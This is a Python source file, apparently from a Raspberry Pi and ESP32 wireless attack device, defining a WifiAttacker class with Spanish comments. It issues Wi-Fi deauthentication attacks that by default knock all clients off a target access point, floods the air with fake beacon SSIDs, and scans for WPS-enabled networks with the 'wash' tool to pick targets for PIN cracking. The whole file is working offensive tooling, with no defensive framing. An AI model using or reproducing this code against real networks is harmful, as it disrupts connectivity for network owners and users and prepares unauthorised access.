import subprocess
from core.logger import get_logger
from core.event_bus import event_bus
from config import config

logger = get_logger('wifi.attacker')

class WifiAttacker:
    def __init__(self):
        self.iface = config.WIFI_IFACE

    def deauth(self, bssid: str, client: str = 'FF:FF:FF:FF:FF:FF', count: int = 10) -> bool:
        """
        Envía frames deauth vía ESP32 (el ESP32 hace el ataque real).
        La Pi solo le manda la instrucción por UART.
        """
        from hardware.esp32_bridge import esp32
        logger.warning(f"Deauth → BSSID={bssid} CLIENT={client} COUNT={count}")
        result = esp32.send('deauth', {
            'bssid':  bssid,
            'client': client,
            'count':  count
        })
        event_bus.publish('wifi.attack', {
            'type':   'deauth',
            'bssid':  bssid,
            'client': client
        })
        return result

    def beacon_flood(self, ssid_prefix: str = 'SENTINEL', count: int = 50) -> bool:
        """Beacon flood vía ESP32."""
        from hardware.esp32_bridge import esp32
        logger.warning(f"Beacon flood → prefix={ssid_prefix} count={count}")
        result = esp32.send('beacon_flood', {
            'prefix': ssid_prefix,
            'count':  count
        })
        event_bus.publish('wifi.attack', {
            'type':   'beacon_flood',
            'prefix': ssid_prefix
        })
        return result

    def wps_scan(self, iface: str = None) -> list[dict]:
        """Escanea redes con WPS habilitado usando wash."""
        iface = iface or self.iface
        logger.info(f"WPS scan en {iface}")
        try:
            result = subprocess.run(
                ['wash', '-i', iface, '--scan-time', '10'],
                capture_output=True, text=True, timeout=15
            )
            networks = self._parse_wash(result.stdout)
            event_bus.publish('wifi.wps_scan', {'networks': networks})
            return networks
        except FileNotFoundError:
            logger.error("wash no instalado (apt install reaver)")
            return []
        except subprocess.TimeoutExpired:
            logger.warning("WPS scan timeout")
            return []

    def _parse_wash(self, output: str) -> list[dict]:
        networks = []
        for line in output.strip().splitlines():
            parts = line.split()
            if len(parts) >= 5 and ':' in parts[0]:
                networks.append({
                    'bssid':   parts[0],
                    'channel': parts[1],
                    'rssi':    parts[2],
                    'wps_ver': parts[3],
                    'locked':  parts[4] == 'Yes',
                    'ssid':    ' '.join(parts[5:]) if len(parts) > 5 else ''
                })
        return networks